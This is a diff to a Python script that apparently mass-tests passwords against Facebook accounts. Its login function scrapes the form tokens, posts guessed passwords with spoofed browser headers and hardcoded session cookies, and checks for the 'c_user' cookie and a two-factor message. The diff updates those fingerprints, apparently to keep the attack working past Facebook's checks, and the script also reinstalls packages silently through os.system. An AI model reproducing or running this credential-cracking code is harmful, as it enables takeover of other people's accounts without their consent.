@@ -1,4 +1,4 @@
-import os,sys,re,time,uuid,json,string,random,base64,platform,pycurl
+ import os,sys,re,time,uuid,json,string,random,base64,platform,pycurl
 from concurrent.futures import ThreadPoolExecutor
 os.system("pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests")
 try:
@@ -1340,56 +1340,58 @@ def p(uid,pwx,tl):
             Session = requests.Session()
             free_fb = Session.get('https://free.facebook.com').text
             data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'display': '',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '',
-            'signed_next': '',
-            'trynum': '14',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '051540_s-9q',
-            'lgnjs': '1737638141',
             'email': uid,
+            'cuid': '',
+            'guid': 'f60fc0d7ca1878ee7',
+            'lgnjs': '1737641679',
+            'lgnrnd': '061438_2qGT',
+            'locale': 'en_GB',
+            'login_source': 'comet_login_header',
+            'next': 'https://www.facebook.com/lohh/?privacy_mutati',
+            'skstamp': '',
+            'timezone': '-330',
             'prefill_contact_point': '',
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'password',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'true',
-            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAVK/KKAVAABFAD',
+            'prefill_source': '',
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lgndim': 'eyJ3IjozOTMsImgiOjg5NSwiYXciOjM5MywiYWgiOjg5NSwiYyI6MjR9',
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJ',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
+            'datr': '6wOAZwj8ucWrosqKX5yE0F6L',
+            'sb': '6wOAZxu0ImfzXdnu02PanLz8',
             'ps_l': '1',
             'ps_n': '1',
-            'datr': '7D6SZzAxLtVRcDEZqyxa5Aet',
-            'usida': 'eyJ2ZXIiOjEsImlkIjoiQXNxamxyaTF5Z3Jqb2siLCJ0aW1lIjoxNzM3NjM3NjQ0fQ%3D%3D',
-            'sb': 'bD-SZ1RZ8QT91OnwM1roAd4P',
-            'locale': 'hi_IN',
-            'fr': '0QhgagN2b0HcuR594..Bnkj9s..AAA.0.0.BnkkD8.AWVGPq1St3A',
-            'wd': '867x773',}
+            'dpr': '2.4515938758850098',
+            'm_pixel_ratio': '2.225780963897705',
+            'locale': 'en_GB',
+            'fr': '06TpxSctU4JzYPWba..BngAPr..AAA.0.0.Bnkk6_.AWU4Pl03Ouw',
+            'wd': '1099x1072',}
             headers = {
+            'authority': 'www.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://hi-in.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
-            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'dpr': '2.75',
+            'origin': 'https://www.facebook.com',
+            'referer': 'https://www.facebook.com/lohh/?privacy_mutati',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
             'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '""',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'viewport-width': '980',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028'
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
